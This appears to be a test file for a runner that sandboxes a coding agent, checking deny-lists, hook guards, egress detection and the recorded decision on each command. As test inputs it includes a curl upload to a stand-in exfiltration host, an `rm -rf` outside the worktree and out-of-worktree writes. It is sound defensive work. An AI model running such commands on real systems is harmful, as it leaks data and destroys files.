import { writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { LimitsTableSchema, invocationShapeHash } from "@perbo/contracts";
import { scratchDirectories } from "@perbo/test-support";
import { ADMISSION_RULES } from "./admission.js";
import {
  AgentConfigurationPresentError,
  CUSTOMIZATION_CLOSURES,
  FORBIDDEN_FLAGS,
  assertNeutralised,
  buildArgv,
  runAgent,
} from "./adapter.js";
import { AttemptCeilings } from "./ceilings.js";
import { buildPermissionProfile, PINNED_PROVIDER_BASE_URL } from "./profile.js";
import { fakeAgent } from "./test-support/fake-agent.js";

const scratch = scratchDirectories("perbo-runner-");

const worktree = scratch("perbo-adapter-");
const profile = buildPermissionProfile({ worktree });

const argvFor = (prompt = "do the thing") =>
  buildArgv({
    worktree,
    prompt,
    model: "claude-opus-5",
    profile,
    settingsPath: "/tmp/perbo-guard/settings.json",
  });

describe("the invocation shape", () => {
  it("suppresses project settings and preserves subscription login (ADR-0030 req 1, D-009)", () => {
    const { argv } = argvFor();
    // `--setting-sources user` rather than `--bare`: the ADR's own appendix
    // says --bare leaves the project env block applying and forces an API key.
    expect(argv).toContain("--setting-sources");
    expect(argv[argv.indexOf("--setting-sources") + 1]).toBe("user");
    expect(argv).not.toContain("--bare");
  });

  it("connects no tool server from any source, which is threat 18", () => {
    const { argv } = argvFor();
    expect(argv).toContain("--strict-mcp-config");
    expect(argv[argv.indexOf("--mcp-config") + 1]).toBe('{"mcpServers":{}}');
  });

  it("loads no hook but the runner's own, which is threat 17 (SCP-177)", () => {
    const { argv } = argvFor();
    // The only settings source the invocation names is the file the runner
    // wrote for this attempt, and the only hook in it is the write guard. A
    // repository hook would have to arrive through project settings, which
    // `--setting-sources user` does not read — measured against a worktree
    // committing one.
    expect(argv[argv.indexOf("--settings") + 1]).toBe("/tmp/perbo-guard/settings.json");
    expect(argv.filter((value) => value === "--settings")).toHaveLength(1);
    // `--safe-mode` turned hooks off, the guard is a hook, and no other
    // mechanism decides a call before it runs under it. What it closed is
    // closed by name instead.
    expect(argv).not.toContain("--safe-mode");
    expect(argv).toContain("--disable-slash-commands");
    expect(Object.keys(CUSTOMIZATION_CLOSURES)).toEqual([
      "CLAUDE_CODE_DISABLE_CLAUDE_MDS",
      "CLAUDE_CODE_DISABLE_AUTO_MEMORY",
    ]);
  });

  it("never passes a flag that reopens the channel", () => {
    const { argv } = argvFor();
    for (const flag of FORBIDDEN_FLAGS) expect(argv).not.toContain(flag);
  });

  it("hands the agent the command allow-list and the deny-list, not a request to behave", () => {
    const { argv } = argvFor();
    const allowed = argv[argv.indexOf("--allowedTools") + 1] ?? "";
    const denied = argv[argv.indexOf("--disallowedTools") + 1] ?? "";
    expect(allowed).toContain("Bash(git status:*)");
    expect(allowed).not.toContain("Bash(git push");
    expect(denied).toContain("Bash(git push:*)");
    expect(denied).toContain("Bash(gh:*)");
    expect(denied).toContain("WebFetch");
    expect(argv[argv.indexOf("--permission-mode") + 1]).toBe("manual");
  });

  it("hands the agent no cost ceiling: the runner's counter is the cap (D-096)", () => {
    const { argv } = argvFor();
    expect(argv).not.toContain("--max-budget-usd");
  });

  it("pins the provider base URL on the profile rather than reading one", () => {
    expect(profile.provider_base_url).toBe(PINNED_PROVIDER_BASE_URL);
  });
});

describe("the recorded shape", () => {
  it("is the same for two different prompts, and different for a different suppression", () => {
    const a = argvFor("implement the signup endpoint");
    const b = argvFor("close the missing-test finding");
    expect(invocationShapeHash(a.argv, a.promptIndexes)).toBe(
      invocationShapeHash(b.argv, b.promptIndexes),
    );

    const widened = [...a.argv, "--add-dir", "/tmp"];
    expect(invocationShapeHash(widened, a.promptIndexes)).not.toBe(
      invocationShapeHash(a.argv, a.promptIndexes),
    );
  });
});

/**
 * How an agent exit is classified, with a real process producing the exit.
 *
 * The binary here writes the stream-json, the stderr notices and the exit code
 * of the two failures that look alike from outside — a transport that gave up
 * and an agent that did — and the adapter reads all three the way it reads the
 * real one's.
 */
describe("an agent that exited without finishing", () => {
  const runFake = async (binary: string) => {
    const worktree = scratch("perbo-adapter-run-");
    return runAgent({
      binary,
      worktree,
      prompt: "do the thing",
      model: "claude-opus-5",
      profile: buildPermissionProfile({ worktree }),
      ceilings: new AttemptCeilings(LimitsTableSchema.parse({ organisation: "test" })),
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" },
    });
  };

  it("records exhausted transport retries as transport_unavailable, with the status and the error text", async () => {
    const agent = fakeAgent(scratch, [{ kind: "overloaded", status: 529, retries: 10 }]);
    const result = await runFake(agent.binary);

    expect(result.termination.reason).toBe("transport_unavailable");
    expect(result.termination.detail).toContain("529");
    expect(result.termination.detail).toContain("overloaded_error");
    expect(result.termination.detail).toContain("Overloaded");
    // The attempt ran no command of its own, which is the point: nothing about
    // the work failed.
    expect(result.commands).toEqual([]);
  }, 30_000);

  it("leaves an ordinary non-zero exit as agent_error", async () => {
    const agent = fakeAgent(scratch, [{ kind: "agent_error" }]);
    const result = await runFake(agent.binary);

    expect(result.termination.reason).toBe("agent_error");
    expect(result.termination.detail).toContain("exited 1");
  }, 30_000);

  it("leaves a 529 the transport retried and served as agent_error too", async () => {
    // The transcript contains a 529 — the agent printed the retry notice — and
    // the agent then worked and failed on something else. The provider is not
    // what ended this attempt and must not be named as though it were.
    const agent = fakeAgent(scratch, [{ kind: "recovered_blip" }]);
    const result = await runFake(agent.binary);

    expect(result.termination.reason).toBe("agent_error");
    expect(result.termination.detail).not.toContain("529");
    expect(result.termination.detail).not.toContain("transport");
  }, 30_000);
});

/**
 * SCP-163: one command, one decision, and a denial that says which rule and
 * which path.
 *
 * The binary here is the real fake agent: it asks for its commands as
 * `tool_use` blocks and then reports the same commands again as
 * `permission_denials` in its result envelope, which is the shape that made
 * AYO-13's record list every command twice — once `allowed`, once `denied`.
 */
describe("the admission decision on the attempt's record", () => {
  const runShell = async (
    commands: readonly string[],
    reported_denials: readonly string[] = [],
  ) => {
    const worktree = scratch("perbo-adapter-decide-");
    const agent = fakeAgent(scratch, [{ kind: "shell", commands, reported_denials }]);
    return runAgent({
      binary: agent.binary,
      worktree,
      prompt: "do the thing",
      model: "claude-opus-5",
      profile: buildPermissionProfile({ worktree }),
      ceilings: new AttemptCeilings(LimitsTableSchema.parse({ organisation: "test" })),
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" },
    });
  };

  it("records one entry for a denied command, with the rule and the target", async () => {
    const denied = "cp a /tmp/b";
    const result = await runShell(["ls -la", denied], [denied]);

    const forCommand = result.commands.filter((command) => command.detail === denied);
    expect(forCommand).toHaveLength(1);
    expect(forCommand[0]?.decision).toBe("denied");
    expect(forCommand[0]?.denial_rule).toBe("write_outside_worktree");
    expect(forCommand[0]?.denial_target).toBe("/tmp/b");
    expect(forCommand[0]?.denial_reason).toContain("outside the worktree");

    // The read that ran beside it is one entry too, and an admitted one.
    const read = result.commands.filter((command) => command.detail === "ls -la");
    expect(read).toHaveLength(1);
    expect(read[0]?.decision).toBe("allowed");
    expect(read[0]?.denial_rule).toBeNull();
    expect(result.commands).toHaveLength(2);
  }, 30_000);

  it("admits the worktree clean-up AYO-13 was refused, and refuses the same verb outside", async () => {
    const result = await runShell([
      "mkdir -p .scratch/.perbo",
      "rm -r .scratch",
      "rm -rf /tmp/evidence",
    ]);
    const decisions = result.commands.map((command) => [command.detail, command.decision]);
    expect(decisions).toEqual([
      ["mkdir -p .scratch/.perbo", "allowed"],
      ["rm -r .scratch", "allowed"],
      ["rm -rf /tmp/evidence", "denied"],
    ]);
  }, 30_000);

  it("decides each of two identical commands, so one denied twice is two rows", async () => {
    // The runner reads two tool calls and admits both; the agent's layer
    // reports both refusals. Two acts, two decisions, both denied.
    const repeated = "ls -la";
    const result = await runShell([repeated, repeated], [repeated, repeated]);
    expect(result.commands).toHaveLength(2);
    expect(result.commands.map((command) => command.decision)).toEqual(["denied", "denied"]);
  }, 30_000);

  it("records a refusal the agent's own layer made and the runner did not see", async () => {
    // A command the runner admits — nothing about it leaves the worktree — that
    // the agent's permission layer refused anyway. One entry, and it is denied.
    const result = await runShell(["ls -la"], ["ls -la"]);
    expect(result.commands).toHaveLength(1);
    expect(result.commands[0]?.decision).toBe("denied");
    expect(result.commands[0]?.denial_rule).toBe("command_allow_list");
    expect(result.commands[0]?.denial_target).toBe("ls -la");
  }, 30_000);

  /**
   * The runner does not author a name denial, because it cannot see one.
   *
   * The agent's permission layer admits more than the runner's allow-list
   * spells: `cd` inside the worktree, `echo`, `pwd` and the other built-ins run
   * without an entry. These three lines are the live shapes — a `cd` into a
   * package before a test command, an `echo` beside a `node -e`, a bare `pwd` —
   * and every one of them ran. A `denied` row against a command that ran is the
   * mirror of the AYO-13 defect SCP-163 was filed to remove, so what the record
   * says is what happened, and the agent's report is the only thing that can
   * make it a refusal.
   */
  const RAN_WITHOUT_A_LIST_ENTRY = [
    "cd packages/evaluation && npx vitest run test/x.test.ts",
    `echo "TMPDIR=$TMPDIR"; node -e 'process.stdout.write("ok")'`,
    "pwd",
  ];

  for (const command of RAN_WITHOUT_A_LIST_ENTRY) {
    it(`admits \`${command}\`, which no list entry carries and no layer refused`, async () => {
      const result = await runShell([command]);
      expect(result.commands).toHaveLength(1);
      expect(result.commands[0]?.decision, command).toBe("allowed");
      expect(result.commands[0]?.denial_rule, command).toBeNull();
      expect(result.commands[0]?.denial_target, command).toBeNull();
      expect(result.commands[0]?.denial_reason, command).toBeNull();
    }, 30_000);

    it(`denies \`${command}\` where the agent's layer reported refusing it`, async () => {
      const result = await runShell([command], [command]);
      expect(result.commands).toHaveLength(1);
      expect(result.commands[0]?.decision, command).toBe("denied");
      expect(result.commands[0]?.denial_rule, command).toBe("command_allow_list");
      expect(result.commands[0]?.denial_target, command).toBe(command);
    }, 30_000);
  }
});

describe("asserting what the agent loaded (ADR-0030 req 3)", () => {
  const clean = {
    mcp_servers: [],
    plugins: [{ name: "some-plugin", path: "/Users/u/.claude/plugins/some-plugin" }],
    skills: ["debug"],
    agents: ["Explore"],
    memory_paths: null,
  };

  it("passes when nothing loaded came from the repository", () => {
    const reported = assertNeutralised(clean, worktree);
    expect(reported.mcp_servers).toEqual([]);
    expect(reported.plugins).toEqual(["some-plugin"]);
  });

  it("fails closed when any tool server is connected at all", () => {
    expect(() =>
      assertNeutralised({ ...clean, mcp_servers: [{ name: "hostile", status: "connected" }] }, worktree),
    ).toThrow(AgentConfigurationPresentError);
  });

  it("fails closed when a tool server was merely attempted", () => {
    expect(() =>
      assertNeutralised({ ...clean, mcp_servers: [], mcp_server_errors: [{ name: "hostile" }] }, worktree),
    ).toThrow(/attempted and failed/);
  });

  it("says every tool server that was attempted, whole (D-NEW-nothing-shown-is-cut)", () => {
    const errors = [1, 2, 3, 4, 5, 6].map((n) => ({ name: `a-tool-server-with-a-long-name-${n}`, error: "refused" }));
    expect(JSON.stringify(errors).length).toBeGreaterThan(200);
    expect(() => assertNeutralised({ ...clean, mcp_servers: [], mcp_server_errors: errors }, worktree)).toThrow(
      JSON.stringify(errors),
    );
  });

  it("fails closed when configuration loaded from inside the worktree", () => {
    expect(() =>
      assertNeutralised(
        { ...clean, plugins: [{ name: "evil", path: join(worktree, ".claude/plugins/evil") }] },
        worktree,
      ),
    ).toThrow(/inside the worktree/);
    expect(() =>
      assertNeutralised({ ...clean, memory_paths: { auto: join(worktree, ".claude/memory") } }, worktree),
    ).toThrow(/inside the worktree/);
  });

  it("carries what was reported on the refusal, so the record survives the failure", () => {
    try {
      assertNeutralised({ ...clean, mcp_servers: [{ name: "hostile" }] }, worktree);
      expect.unreachable("should have thrown");
    } catch (error) {
      expect((error as AgentConfigurationPresentError).reported.mcp_servers).toEqual(["hostile"]);
    }
  });
});

/**
 * SCP-177: a hit the guard already prevented does not end the attempt.
 *
 * The runner reads a `tool_use` block and its own resolver says the line writes
 * outside the worktree — which used to end the attempt on the spot, correctly,
 * because before the hook existed the write had already happened. It has not
 * happened now: the hook refused the call between the block and the tool. An
 * attempt terminated for it would be the false positive SCP-156 exists to have
 * stopped, and it cost a $15.25 run once.
 *
 * Both halves are here because only the pair pins the behaviour. Removing the
 * check leaves the first failing and the second passing; removing the whole
 * settlement leaves the second failing and the first passing.
 *
 * The stream is scripted rather than driven by an agent's own decisions, so the
 * order the settlement depends on is the test's: the block, then the hook, then
 * the tool's result. The `system` step in between is not incidental — measured
 * on the pinned binary with `--include-hook-events`, one is emitted while the
 * hook is still running, and settling on it would read the decisions file
 * before the decision was in it.
 */
describe("a prohibited action on a call the guard refused first", () => {
  const outside = join(tmpdir(), `perbo-scp177-settle-${process.pid}`);
  const command = `echo x > ${outside}`;
  const call = { id: "toolu_settle_1", tool: "Bash", input: { command } };

  /** `hookProgram` absent runs the real guard, which writes the decision line. */
  const runScripted = async (options: { hookProgram?: readonly string[] } = {}) => {
    const worktree = scratch("perbo-scp177-settle-");
    const agent = fakeAgent(scratch, [
      {
        kind: "scripted",
        steps: [
          { step: "tool_use", ...call },
          { step: "hook", ...call },
          { step: "system", subtype: "task_summary" },
          { step: "tool_result", id: call.id, text: "refused", is_error: true },
          { step: "result", denials: [{ tool: "Bash", id: call.id, input: call.input }] },
        ],
      },
    ]);
    return runAgent({
      binary: agent.binary,
      worktree,
      prompt: "do the thing",
      model: "none",
      profile: buildPermissionProfile({ worktree }),
      ceilings: new AttemptCeilings(LimitsTableSchema.parse({ organisation: "test" })),
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" },
      ...(options.hookProgram ? { hookProgram: options.hookProgram } : {}),
    });
  };

  it("does not terminate the attempt, and the record is the guard's refusal", async () => {
    const result = await runScripted();

    expect(result.termination.reason).not.toBe("prohibited_action");
    expect(result.termination.reason).toBe("completed");
    expect(result.prohibited).toEqual([]);

    const [entry] = result.commands;
    expect(entry?.decision).toBe("denied");
    expect(entry?.denial_rule).toBe(ADMISSION_RULES.write);
    expect(entry?.denial_target).toBe(outside);
    expect(entry?.decided_by).toBe("pre_execution_hook");
    // The agent's own report of the same refusal amends nothing: it would have
    // replaced the rule and the target with a bare allow-list refusal.
    expect(result.commands).toHaveLength(1);
  }, 60_000);

  it("still terminates it where no decision says the guard refused anything", async () => {
    // The same stream with a hook that writes nothing — a binary that stopped
    // honouring hooks looks exactly like this — so the transcript reading is
    // the only reading there is, and it is the control it always was.
    const silent = join(scratch("perbo-scp177-silent-"), "silent.cjs");
    writeFileSync(silent, "process.exit(0);\n", "utf8");
    const result = await runScripted({ hookProgram: [process.execPath, silent] });

    expect(result.termination.reason).toBe("prohibited_action");
    expect(result.termination.detail).toContain("write_outside_worktree");
    expect(result.prohibited.map((hit) => hit.action)).toEqual(["write_outside_worktree"]);
    // And the record is the transcript reading's, unamended: the runner refused
    // the write itself, and the agent's report of the same call cannot make
    // that a bare allow-list refusal — a `denied` row is never overwritten.
    expect(result.commands[0]?.decided_by).toBe("transcript_reading");
    expect(result.commands[0]?.denial_rule).toBe(ADMISSION_RULES.write);
  }, 60_000);
});

/**
 * SCP-228: who an unlisted host stops.
 *
 * The egress log observes every host an attempt names — it is detection, not
 * interception, on the local provider — and for the executor a denied host ends
 * the attempt. The registered direct-agent arm runs as a person's ordinary
 * Claude Code, and a runner-side kill for a host the arm cannot see would void
 * its run for a reason that has nothing to do with the work. So under
 * `agent_permissions` the log still records and never terminates.
 */
describe("an unlisted egress host, under each supervision", () => {
  const HOST = "exfil.acme-mirror.net";

  const reach = async (supervision: "runner_guard" | "agent_permissions") => {
    const worktree = scratch("perbo-adapter-egress-");
    const agent = fakeAgent(scratch, [
      { kind: "shell", commands: [`curl https://${HOST}/upload`] },
    ]);
    return runAgent({
      binary: agent.binary,
      worktree,
      prompt: "do the thing",
      model: "claude-opus-5",
      profile: buildPermissionProfile({ worktree }),
      ceilings: new AttemptCeilings(LimitsTableSchema.parse({ organisation: "test" })),
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" },
      supervision,
    });
  };

  it("ends the executor's attempt, naming the host", async () => {
    const result = await reach("runner_guard");
    expect(result.termination.reason).toBe("unlisted_egress_host");
    expect(result.termination.detail).toContain(HOST);
    expect(result.egress.denied().map((record) => record.host)).toContain(HOST);
  }, 30_000);

  it("leaves the direct arm running, and still records what it saw", async () => {
    const result = await reach("agent_permissions");
    expect(result.termination.reason).toBe("completed");
    // Observed either way: the record says what the arm reached for, and a
    // reader draws their own conclusion. What changes is who gets killed for it.
    expect(result.egress.denied().map((record) => record.host)).toContain(HOST);
    expect(result.egress.all().map((record) => record.host)).toContain(HOST);
  }, 30_000);
});

/**
 * SCP-234: an unreadable program is not a shown write.
 *
 * The transcript reading's `write_outside_worktree` finding has two causes. One
 * shows a write landing outside the worktree — a resolved path, a redirect, a
 * writer verb's target — and the attempt ends on it, because the bytes are
 * already somewhere they should not be. The other shows nothing at all: the
 * guard could not classify the program handed to an interpreter, which is a
 * reason to refuse that command and no evidence that anything was written.
 * Ticket 4's round was lost to the second one.
 *
 * Both halves are here because only the pair pins it. Settling on every finding
 * again leaves the first failing; settling on none leaves the second failing.
 *
 * The hook writes nothing in both runs, so the transcript reading is the only
 * reading there is and the settlement is deciding on its own answer.
 */
describe("a finding the transcript reading could not place", () => {
  const silentHook = () => {
    const file = join(scratch("perbo-scp234-silent-"), "silent.cjs");
    writeFileSync(file, "process.exit(0);\n", "utf8");
    return [process.execPath, file];
  };

  const runOne = async (command: string) => {
    const worktree = scratch("perbo-scp234-settle-");
    const call = { id: "toolu_scp234_1", tool: "Bash", input: { command } };
    const agent = fakeAgent(scratch, [
      {
        kind: "scripted",
        steps: [
          { step: "tool_use", ...call },
          { step: "hook", ...call },
          { step: "system", subtype: "task_summary" },
          { step: "tool_result", id: call.id, text: "ok" },
          { step: "result" },
        ],
      },
    ]);
    return runAgent({
      binary: agent.binary,
      worktree,
      prompt: "do the thing",
      model: "none",
      profile: buildPermissionProfile({ worktree }),
      ceilings: new AttemptCeilings(LimitsTableSchema.parse({ organisation: "test" })),
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" },
      hookProgram: silentHook(),
    });
  };

  const UNREADABLE = ["python3 - <<'PY'", "import os", "print(os.uname())", "PY"].join("\n");
  const OUTSIDE = ["python3 - <<'PY'", "open('/tmp/x','w')", "PY"].join("\n");

  it("records the program it could not read as denied, and lets the attempt run on", async () => {
    const result = await runOne(UNREADABLE);

    expect(result.termination.reason).toBe("completed");
    expect(result.prohibited).toEqual([]);

    const [entry] = result.commands;
    expect(entry?.decision).toBe("denied");
    expect(entry?.denial_rule).toBe(ADMISSION_RULES.unreadable_inline_program);
    expect(entry?.decided_by).toBe("transcript_reading");
    expect(entry?.denial_reason ?? "").toContain("python3");
  }, 60_000);

  it("still ends the attempt where the same shape shows a write outside the worktree", async () => {
    const result = await runOne(OUTSIDE);

    expect(result.termination.reason).toBe("prohibited_action");
    expect(result.termination.detail).toContain("write_outside_worktree");
    expect(result.prohibited.map((hit) => hit.action)).toEqual(["write_outside_worktree"]);
    expect(result.commands[0]?.decision).toBe("denied");
    expect(result.commands[0]?.denial_rule).toBe(ADMISSION_RULES.write);
  }, 60_000);
});

describe("the executor's effort", () => {
  it("follows the model as --effort where the run configured one, and is absent where it did not", () => {
    const { argv } = buildArgv({
      worktree,
      prompt: "do the thing",
      model: "claude-opus-5",
      effort: "max",
      profile,
      settingsPath: "/tmp/perbo-guard/settings.json",
    });
    expect(argv.slice(argv.indexOf("--model"), argv.indexOf("--model") + 4)).toEqual([
      "--model",
      "claude-opus-5",
      "--effort",
      "max",
    ]);
    expect(argvFor().argv).not.toContain("--effort");
  });
});
